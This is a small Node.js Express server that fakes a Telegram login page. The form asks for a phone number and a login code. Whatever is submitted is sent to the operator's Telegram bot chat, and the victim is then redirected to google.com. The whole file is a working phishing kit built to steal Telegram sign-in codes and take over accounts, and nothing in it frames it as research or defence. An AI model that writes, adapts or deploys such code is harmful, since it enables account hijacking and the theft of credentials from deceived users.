const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  res.send(`
    <h2>Telegram Login</h2>
    <form action="/api/login" method="post">
      <input name="phone" placeholder="Phone number" required><br>
      <input name="code" placeholder="Code" required><br>
      <button type="submit">Sign in</button>
    </form>
  `);
});

app.post('/api/login', (req, res) => {
  const data = req.body;
  sendToTelegram(`🔐 LOGIN\n${JSON.stringify(data, null, 2)}`);
  res.send('Success. Redirecting...<script>setTimeout(()=>{location="https://google.com"},2000)</script>');
});

app.listen(PORT, () => console.log('Running on port', PORT));
